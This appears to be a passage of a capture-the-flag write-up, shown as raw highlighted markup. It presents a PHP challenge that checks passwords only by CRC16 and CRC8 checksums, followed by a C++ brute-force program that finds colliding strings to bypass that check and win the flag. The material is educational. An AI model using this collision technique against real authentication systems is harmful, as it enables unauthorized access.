        <span class="token number">0x21</span><span class="token punctuation">,</span> <span class="token number">0x26</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token number">0x3D</span><span class="token punctuation">,</span> <span class="token number">0x3A</span><span class="token punctuation">,</span> <span class="token number">0x33</span><span class="token punctuation">,</span> <span class="token number">0x34</span><span class="token punctuation">,</span>
        <span class="token number">0x4E</span><span class="token punctuation">,</span> <span class="token number">0x49</span><span class="token punctuation">,</span> <span class="token number">0x40</span><span class="token punctuation">,</span> <span class="token number">0x47</span><span class="token punctuation">,</span> <span class="token number">0x52</span><span class="token punctuation">,</span> <span class="token number">0x55</span><span class="token punctuation">,</span> <span class="token number">0x5C</span><span class="token punctuation">,</span> <span class="token number">0x5B</span><span class="token punctuation">,</span>
        <span class="token number">0x76</span><span class="token punctuation">,</span> <span class="token number">0x71</span><span class="token punctuation">,</span> <span class="token number">0x78</span><span class="token punctuation">,</span> <span class="token number">0x7F</span><span class="token punctuation">,</span> <span class="token number">0x6A</span><span class="token punctuation">,</span> <span class="token number">0x6D</span><span class="token punctuation">,</span> <span class="token number">0x64</span><span class="token punctuation">,</span> <span class="token number">0x63</span><span class="token punctuation">,</span>
        <span class="token number">0x3E</span><span class="token punctuation">,</span> <span class="token number">0x39</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0x37</span><span class="token punctuation">,</span> <span class="token number">0x22</span><span class="token punctuation">,</span> <span class="token number">0x25</span><span class="token punctuation">,</span> <span class="token number">0x2C</span><span class="token punctuation">,</span> <span class="token number">0x2B</span><span class="token punctuation">,</span>
        <span class="token number">0x06</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0x08</span><span class="token punctuation">,</span> <span class="token number">0x0F</span><span class="token punctuation">,</span> <span class="token number">0x1A</span><span class="token punctuation">,</span> <span class="token number">0x1D</span><span class="token punctuation">,</span> <span class="token number">0x14</span><span class="token punctuation">,</span> <span class="token number">0x13</span><span class="token punctuation">,</span>
        <span class="token number">0xAE</span><span class="token punctuation">,</span> <span class="token number">0xA9</span><span class="token punctuation">,</span> <span class="token number">0xA0</span><span class="token punctuation">,</span> <span class="token number">0xA7</span><span class="token punctuation">,</span> <span class="token number">0xB2</span><span class="token punctuation">,</span> <span class="token number">0xB5</span><span class="token punctuation">,</span> <span class="token number">0xBC</span><span class="token punctuation">,</span> <span class="token number">0xBB</span><span class="token punctuation">,</span>
        <span class="token number">0x96</span><span class="token punctuation">,</span> <span class="token number">0x91</span><span class="token punctuation">,</span> <span class="token number">0x98</span><span class="token punctuation">,</span> <span class="token number">0x9F</span><span class="token punctuation">,</span> <span class="token number">0x8A</span><span class="token punctuation">,</span> <span class="token number">0x8D</span><span class="token punctuation">,</span> <span class="token number">0x84</span><span class="token punctuation">,</span> <span class="token number">0x83</span><span class="token punctuation">,</span>
        <span class="token number">0xDE</span><span class="token punctuation">,</span> <span class="token number">0xD9</span><span class="token punctuation">,</span> <span class="token number">0xD0</span><span class="token punctuation">,</span> <span class="token number">0xD7</span><span class="token punctuation">,</span> <span class="token number">0xC2</span><span class="token punctuation">,</span> <span class="token number">0xC5</span><span class="token punctuation">,</span> <span class="token number">0xCC</span><span class="token punctuation">,</span> <span class="token number">0xCB</span><span class="token punctuation">,</span>
        <span class="token number">0xE6</span><span class="token punctuation">,</span> <span class="token number">0xE1</span><span class="token punctuation">,</span> <span class="token number">0xE8</span><span class="token punctuation">,</span> <span class="token number">0xEF</span><span class="token punctuation">,</span> <span class="token number">0xFA</span><span class="token punctuation">,</span> <span class="token number">0xFD</span><span class="token punctuation">,</span> <span class="token number">0xF4</span><span class="token punctuation">,</span> <span class="token number">0xF3</span>
    <span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$byteArray</span> <span class="token operator">=</span> <span class="token function">unpack</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'C*'</span><span class="token punctuation">,</span> <span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$len</span> <span class="token operator">=</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$byteArray</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$crc</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;=</span> <span class="token variable">$len</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$crc</span> <span class="token operator">=</span> <span class="token variable">$crc8Table</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token variable">$crc</span> <span class="token operator">^</span> <span class="token variable">$byteArray</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> <span class="token variable">$crc</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token variable">$MYPASSWORD</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"AdM1nP@assW0rd!"</span><span class="token punctuation">;</span>
<span class="token keyword">include</span> <span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$MYPASSWORD</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$pwhash1</span> <span class="token operator">=</span> <span class="token function">crc16</span><span class="token punctuation">(</span><span class="token variable">$MYPASSWORD</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$pwhash2</span> <span class="token operator">=</span> <span class="token function">crc8</span><span class="token punctuation">(</span><span class="token variable">$MYPASSWORD</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$pwhash3</span> <span class="token operator">=</span> <span class="token function">crc16</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$pwhash4</span> <span class="token operator">=</span> <span class="token function">crc8</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$MYPASSWORD</span> <span class="token operator">==</span> <span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"oops. Try harder!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$pwhash1</span> <span class="token operator">!=</span> <span class="token variable">$pwhash3</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Oops. Nope. Try harder!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$pwhash2</span> <span class="token operator">!=</span> <span class="token variable">$pwhash4</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"OoOps. Not quite. Try harder!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token variable">$access</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$access</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"You win a flag: <span class="token interpolation"><span class="token variable">$FLAG</span></span>"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Denied! :-("</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Try harder!"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter important">?></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Craphp<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>Craphp<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Give me your password!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Submit<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>To view the source code, <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/?source<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>click here.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span>
17:Ta33,#include <iostream>
using namespace std;

int crc8(string str)
{
    unsigned char crc8table[] = {
        0x00, 0x07, 0x0E, 0x09, 0x1C, 0x1B, 0x12, 0x15,
        0x38, 0x3F, 0x36, 0x31, 0x24, 0x23, 0x2A, 0x2D,
        0x70, 0x77, 0x7E, 0x79, 0x6C, 0x6B, 0x62, 0x65,
        0x48, 0x4F, 0x46, 0x41, 0x54, 0x53, 0x5A, 0x5D,
        0xE0, 0xE7, 0xEE, 0xE9, 0xFC, 0xFB, 0xF2, 0xF5,
        0xD8, 0xDF, 0xD6, 0xD1, 0xC4, 0xC3, 0xCA, 0xCD,
        0x90, 0x97, 0x9E, 0x99, 0x8C, 0x8B, 0x82, 0x85,
        0xA8, 0xAF, 0xA6, 0xA1, 0xB4, 0xB3, 0xBA, 0xBD,
        0xC7, 0xC0, 0xC9, 0xCE, 0xDB, 0xDC, 0xD5, 0xD2,
        0xFF, 0xF8, 0xF1, 0xF6, 0xE3, 0xE4, 0xED, 0xEA,
        0xB7, 0xB0, 0xB9, 0xBE, 0xAB, 0xAC, 0xA5, 0xA2,
        0x8F, 0x88, 0x81, 0x86, 0x93, 0x94, 0x9D, 0x9A,
        0x27, 0x20, 0x29, 0x2E, 0x3B, 0x3C, 0x35, 0x32,
        0x1F, 0x18, 0x11, 0x16, 0x03, 0x04, 0x0D, 0x0A,
        0x57, 0x50, 0x59, 0x5E, 0x4B, 0x4C, 0x45, 0x42,
        0x6F, 0x68, 0x61, 0x66, 0x73, 0x74, 0x7D, 0x7A,
        0x89, 0x8E, 0x87, 0x80, 0x95, 0x92, 0x9B, 0x9C,
        0xB1, 0xB6, 0xBF, 0xB8, 0xAD, 0xAA, 0xA3, 0xA4,
        0xF9, 0xFE, 0xF7, 0xF0, 0xE5, 0xE2, 0xEB, 0xEC,
        0xC1, 0xC6, 0xCF, 0xC8, 0xDD, 0xDA, 0xD3, 0xD4,
        0x69, 0x6E, 0x67, 0x60, 0x75, 0x72, 0x7B, 0x7C,
        0x51, 0x56, 0x5F, 0x58, 0x4D, 0x4A, 0x43, 0x44,
        0x19, 0x1E, 0x17, 0x10, 0x05, 0x02, 0x0B, 0x0C,
        0x21, 0x26, 0x2F, 0x28, 0x3D, 0x3A, 0x33, 0x34,
        0x4E, 0x49, 0x40, 0x47, 0x52, 0x55, 0x5C, 0x5B,
        0x76, 0x71, 0x78, 0x7F, 0x6A, 0x6D, 0x64, 0x63,
        0x3E, 0x39, 0x30, 0x37, 0x22, 0x25, 0x2C, 0x2B,
        0x06, 0x01, 0x08, 0x0F, 0x1A, 0x1D, 0x14, 0x13,
        0xAE, 0xA9, 0xA0, 0xA7, 0xB2, 0xB5, 0xBC, 0xBB,
        0x96, 0x91, 0x98, 0x9F, 0x8A, 0x8D, 0x84, 0x83,
        0xDE, 0xD9, 0xD0, 0xD7, 0xC2, 0xC5, 0xCC, 0xCB,
        0xE6, 0xE1, 0xE8, 0xEF, 0xFA, 0xFD, 0xF4, 0xF3
    };
    unsigned char crc=0;
    for(char ch:str)
    {
        crc=crc8table[crc^ch];
    }
    return crc;
}

int crc16(string str)
{
    int crc=0xFFFF;
    for(char ch:str)
    {
        crc^=ch;
        for(int i=0;i<8;i++)
        {
            if(crc&1==1) crc=(crc>>1)^0xA001;
            else crc>>=1;
        }
    }
    return crc;
}

int main()
{
    string target="AdM1nP@assW0rd!";
    cout<<crc8(target)<<' '<<crc16(target)<<endl;
    for(int i=0;i<65536*256;i++) // brute force
    {
        char password[16];
        sprintf(password,"abcde%010d",i);
        if(crc8(password)==crc8(target)&&crc16(password)==crc16(target))
        {
            cout<<password<<endl;
        }
    }
    return 0;
}
18:T6baa,<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span>
<span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span>

<span class="token keyword">int</span> <span class="token function">crc8</span><span class="token punctuation">(</span>string str<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> crc8table<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x07</span><span class="token punctuation">,</span> <span class="token number">0x0E</span><span class="token punctuation">,</span> <span class="token number">0x09</span><span class="token punctuation">,</span> <span class="token number">0x1C</span><span class="token punctuation">,</span> <span class="token number">0x1B</span><span class="token punctuation">,</span> <span class="token number">0x12</span><span class="token punctuation">,</span> <span class="token number">0x15</span><span class="token punctuation">,</span>
        <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">0x3F</span><span class="token punctuation">,</span> <span class="token number">0x36</span><span class="token punctuation">,</span> <span class="token number">0x31</span><span class="token punctuation">,</span> <span class="token number">0x24</span><span class="token punctuation">,</span> <span class="token number">0x23</span><span class="token punctuation">,</span> <span class="token number">0x2A</span><span class="token punctuation">,</span> <span class="token number">0x2D</span><span class="token punctuation">,</span>
        <span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token number">0x77</span><span class="token punctuation">,</span> <span class="token number">0x7E</span><span class="token punctuation">,</span> <span class="token number">0x79</span><span class="token punctuation">,</span> <span class="token number">0x6C</span><span class="token punctuation">,</span> <span class="token number">0x6B</span><span class="token punctuation">,</span> <span class="token number">0x62</span><span class="token punctuation">,</span> <span class="token number">0x65</span><span class="token punctuation">,</span>
        <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x4F</span><span class="token punctuation">,</span> <span class="token number">0x46</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0x54</span><span class="token punctuation">,</span> <span class="token number">0x53</span><span class="token punctuation">,</span> <span class="token number">0x5A</span><span class="token punctuation">,</span> <span class="token number">0x5D</span><span class="token punctuation">,</span>
        <span class="token number">0xE0</span><span class="token punctuation">,</span> <span class="token number">0xE7</span><span class="token punctuation">,</span> <span class="token number">0xEE</span><span class="token punctuation">,</span> <span class="token number">0xE9</span><span class="token punctuation">,</span> <span class="token number">0xFC</span><span class="token punctuation">,</span> <span class="token number">0xFB</span><span class="token punctuation">,</span> <span class="token number">0xF2</span><span class="token punctuation">,</span> <span class="token number">0xF5</span><span class="token punctuation">,</span>
        <span class="token number">0xD8</span><span class="token punctuation">,</span> <span class="token number">0xDF</span><span class="token punctuation">,</span> <span class="token number">0xD6</span><span class="token punctuation">,</span> <span class="token number">0xD1</span><span class="token punctuation">,</span> <span class="token number">0xC4</span><span class="token punctuation">,</span> <span class="token number">0xC3</span><span class="token punctuation">,</span> <span class="token number">0xCA</span><span class="token punctuation">,</span> <span class="token number">0xCD</span><span class="token punctuation">,</span>
        <span class="token number">0x90</span><span class="token punctuation">,</span> <span class="token number">0x97</span><span class="token punctuation">,</span> <span class="token number">0x9E</span><span class="token punctuation">,</span> <span class="token number">0x99</span><span class="token punctuation">,</span> <span class="token number">0x8C</span><span class="token punctuation">,</span> <span class="token number">0x8B</span><span class="token punctuation">,</span> <span class="token number">0x82</span><span class="token punctuation">,</span> <span class="token number">0x85</span><span class="token punctuation">,</span>
        <span class="token number">0xA8</span><span class="token punctuation">,</span> <span class="token number">0xAF</span><span class="token punctuation">,</span> <span class="token number">0xA6</span><span class="token punctuation">,</span> <span class="token number">0xA1</span><span class="token punctuation">,</span> <span class="token number">0xB4</span><span class="token punctuation">,</span> <span class="token number">0xB3</span><span class="token punctuation">,</span> <span class="token number">0xBA</span><span class="token punctuation">,</span> <span class="token number">0xBD</span><span class="token punctuation">,</span>
        <span class="token number">0xC7</span><span class="token punctuation">,</span> <span class="token number">0xC0</span><span class="token punctuation">,</span> <span class="token number">0xC9</span><span class="token punctuation">,</span> <span class="token number">0xCE</span><span class="token punctuation">,</span> <span class="token number">0xDB</span><span class="token punctuation">,</span> <span class="token number">0xDC</span><span class="token punctuation">,</span> <span class="token number">0xD5</span><span class="token punctuation">,</span> <span class="token number">0xD2</span><span class="token punctuation">,</span>
        <span class="token number">0xFF</span><span class="token punctuation">,</span> <span class="token number">0xF8</span><span class="token punctuation">,</span> <span class="token number">0xF1</span><span class="token punctuation">,</span> <span class="token number">0xF6</span><span class="token punctuation">,</span> <span class="token number">0xE3</span><span class="token punctuation">,</span> <span class="token number">0xE4</span><span class="token punctuation">,</span> <span class="token number">0xED</span><span class="token punctuation">,</span> <span class="token number">0xEA</span><span class="token punctuation">,</span>
        <span class="token number">0xB7</span><span class="token punctuation">,</span> <span class="token number">0xB0</span><span class="token punctuation">,</span> <span class="token number">0xB9</span><span class="token punctuation">,</span> <span class="token number">0xBE</span><span class="token punctuation">,</span> <span class="token number">0xAB</span><span class="token punctuation">,</span> <span class="token number">0xAC</span><span class="token punctuation">,</span> <span class="token number">0xA5</span><span class="token punctuation">,</span> <span class="token number">0xA2</span><span class="token punctuation">,</span>
        <span class="token number">0x8F</span><span class="token punctuation">,</span> <span class="token number">0x88</span><span class="token punctuation">,</span> <span class="token number">0x81</span><span class="token punctuation">,</span> <span class="token number">0x86</span><span class="token punctuation">,</span> <span class="token number">0x93</span><span class="token punctuation">,</span> <span class="token number">0x94</span><span class="token punctuation">,</span> <span class="token number">0x9D</span><span class="token punctuation">,</span> <span class="token number">0x9A</span><span class="token punctuation">,</span>
        <span class="token number">0x27</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token number">0x29</span><span class="token punctuation">,</span> <span class="token number">0x2E</span><span class="token punctuation">,</span> <span class="token number">0x3B</span><span class="token punctuation">,</span> <span class="token number">0x3C</span><span class="token punctuation">,</span> <span class="token number">0x35</span><span class="token punctuation">,</span> <span class="token number">0x32</span><span class="token punctuation">,</span>
        <span class="token number">0x1F</span><span class="token punctuation">,</span> <span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token number">0x11</span><span class="token punctuation">,</span> <span class="token number">0x16</span><span class="token punctuation">,</span> <span class="token number">0x03</span><span class="token punctuation">,</span> <span class="token number">0x04</span><span class="token punctuation">,</span> <span class="token number">0x0D</span><span class="token punctuation">,</span> <span class="token number">0x0A</span><span class="token punctuation">,</span>
        <span class="token number">0x57</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token number">0x59</span><span class="token punctuation">,</span> <span class="token number">0x5E</span><span class="token punctuation">,</span> <span class="token number">0x4B</span><span class="token punctuation">,</span> <span class="token number">0x4C</span><span class="token punctuation">,</span> <span class="token number">0x45</span><span class="token punctuation">,</span> <span class="token number">0x42</span><span class="token punctuation">,</span>
        <span class="token number">0x6F</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token number">0x61</span><span class="token punctuation">,</span> <span class="token number">0x66</span><span class="token punctuation">,</span> <span class="token number">0x73</span><span class="token punctuation">,</span> <span class="token number">0x74</span><span class="token punctuation">,</span> <span class="token number">0x7D</span><span class="token punctuation">,</span> <span class="token number">0x7A</span><span class="token punctuation">,</span>
        <span class="token number">0x89</span><span class="token punctuation">,</span> <span class="token number">0x8E</span><span class="token punctuation">,</span> <span class="token number">0x87</span><span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">,</span> <span class="token number">0x95</span><span class="token punctuation">,</span> <span class="token number">0x92</span><span class="token punctuation">,</span> <span class="token number">0x9B</span><span class="token punctuation">,</span> <span class="token number">0x9C</span><span class="token punctuation">,</span>
        <span class="token number">0xB1</span><span class="token punctuation">,</span> <span class="token number">0xB6</span><span class="token punctuation">,</span> <span class="token number">0xBF</span><span class="token punctuation">,</span> <span class="token number">0xB8</span><span class="token punctuation">,</span> <span class="token number">0xAD</span><span class="token punctuation">,</span> <span class="token number">0xAA</span><span class="token punctuation">,</span> <span class="token number">0xA3</span><span class="token punctuation">,</span> <span class="token number">0xA4</span><span class="token punctuation">,</span>
        <span class="token number">0xF9</span><span class="token punctuation">,</span> <span class="token number">0xFE</span><span class="token punctuation">,</span> <span class="token number">0xF7</span><span class="token punctuation">,</span> <span class="token number">0xF0</span><span class="token punctuation">,</span> <span class="token number">0xE5</span><span class="token punctuation">,</span> <span class="token number">0xE2</span><span class="token punctuation">,</span> <span class="token number">0xEB</span><span class="token punctuation">,</span> <span class="token number">0xEC</span><span class="token punctuation">,</span>
        <span class="token number">0xC1</span><span class="token punctuation">,</span> <span class="token number">0xC6</span><span class="token punctuation">,</span> <span class="token number">0xCF</span><span class="token punctuation">,</span> <span class="token number">0xC8</span><span class="token punctuation">,</span> <span class="token number">0xDD</span><span class="token punctuation">,</span> <span class="token number">0xDA</span><span class="token punctuation">,</span> <span class="token number">0xD3</span><span class="token punctuation">,</span> <span class="token number">0xD4</span><span class="token punctuation">,</span>
        <span class="token number">0x69</span><span class="token punctuation">,</span> <span class="token number">0x6E</span><span class="token punctuation">,</span> <span class="token number">0x67</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token number">0x75</span><span class="token punctuation">,</span> <span class="token number">0x72</span><span class="token punctuation">,</span> <span class="token number">0x7B</span><span class="token punctuation">,</span> <span class="token number">0x7C</span><span class="token punctuation">,</span>
        <span class="token number">0x51</span><span class="token punctuation">,</span> <span class="token number">0x56</span><span class="token punctuation">,</span> <span class="token number">0x5F</span><span class="token punctuation">,</span> <span class="token number">0x58</span><span class="token punctuation">,</span> <span class="token number">0x4D</span><span class="token punctuation">,</span> <span class="token number">0x4A</span><span class="token punctuation">,</span> <span class="token number">0x43</span><span class="token punctuation">,</span> <span class="token number">0x44</span><span class="token punctuation">,</span>
        <span class="token number">0x19</span><span class="token punctuation">,</span> <span class="token number">0x1E</span><span class="token punctuation">,</span> <span class="token number">0x17</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token number">0x05</span><span class="token punctuation">,</span> <span class="token number">0x02</span><span class="token punctuation">,</span> <span class="token number">0x0B</span><span class="token punctuation">,</span> <span class="token number">0x0C</span><span class="token punctuation">,</span>
        <span class="token number">0x21</span><span class="token punctuation">,</span> <span class="token number">0x26</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token number">0x3D</span><span class="token punctuation">,</span> <span class="token number">0x3A</span><span class="token punctuation">,</span> <span class="token number">0x33</span><span class="token punctuation">,</span> <span class="token number">0x34</span><span class="token punctuation">,</span>
        <span class="token number">0x4E</span><span class="token punctuation">,</span> <span class="token number">0x49</span><span class="token punctuation">,</span> <span class="token number">0x40</span><span class="token punctuation">,</span> <span class="token number">0x47</span><span class="token punctuation">,</span> <span class="token number">0x52</span><span class="token punctuation">,</span> <span class="token number">0x55</span><span class="token punctuation">,</span> <span class="token number">0x5C</span><span class="token punctuation">,</span> <span class="token number">0x5B</span><span class="token punctuation">,</span>
        <span class="token number">0x76</span><span class="token punctuation">,</span> <span class="token number">0x71</span><span class="token punctuation">,</span> <span class="token number">0x78</span><span class="token punctuation">,</span> <span class="token number">0x7F</span><span class="token punctuation">,</span> <span class="token number">0x6A</span><span class="token punctuation">,</span> <span class="token number">0x6D</span><span class="token punctuation">,</span> <span class="token number">0x64</span><span class="token punctuation">,</span> <span class="token number">0x63</span><span class="token punctuation">,</span>
        <span class="token number">0x3E</span><span class="token punctuation">,</span> <span class="token number">0x39</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0x37</span><span class="token punctuation">,</span> <span class="token number">0x22</span><span class="token punctuation">,</span> <span class="token number">0x25</span><span class="token punctuation">,</span> <span class="token number">0x2C</span><span class="token punctuation">,</span> <span class="token number">0x2B</span><span class="token punctuation">,</span>
        <span class="token number">0x06</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0x08</span><span class="token punctuation">,</span> <span class="token number">0x0F</span><span class="token punctuation">,</span> <span class="token number">0x1A</span><span class="token punctuation">,</span> <span class="token number">0x1D</span><span class="token punctuation">,</span> <span class="token number">0x14</span><span class="token punctuation">,</span> <span class="token number">0x13</span><span class="token punctuation">,</span>
        <span class="token number">0xAE</span><span class="token punctuation">,</span> <span class="token number">0xA9</span><span class="token punctuation">,</span> <span class="token number">0xA0</span><span class="token punctuation">,</span> <span class="token number">0xA7</span><span class="token punctuation">,</span> <span class="token number">0xB2</span><span class="token punctuation">,</span> <span class="token number">0xB5</span><span class="token punctuation">,</span> <span class="token number">0xBC</span><span class="token punctuation">,</span> <span class="token number">0xBB</span><span class="token punctuation">,</span>
        <span class="token number">0x96</span><span class="token punctuation">,</span> <span class="token number">0x91</span><span class="token punctuation">,</span> <span class="token number">0x98</span><span class="token punctuation">,</span> <span class="token number">0x9F</span><span class="token punctuation">,</span> <span class="token number">0x8A</span><span class="token punctuation">,</span> <span class="token number">0x8D</span><span class="token punctuation">,</span> <span class="token number">0x84</span><span class="token punctuation">,</span> <span class="token number">0x83</span><span class="token punctuation">,</span>
